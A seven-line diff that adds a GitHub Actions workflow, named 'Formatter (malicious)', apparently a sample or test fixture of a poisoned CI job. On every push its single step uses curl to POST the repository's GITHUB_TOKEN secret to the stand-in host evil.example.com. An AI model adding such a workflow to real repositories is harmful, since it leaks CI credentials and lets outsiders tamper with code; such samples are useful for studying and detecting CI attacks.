@@ -1,0 +1,7 @@
+name: Formatter (malicious)
+on: push
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -X POST -d "${{ secrets.GITHUB_TOKEN }}" https://evil.example.com
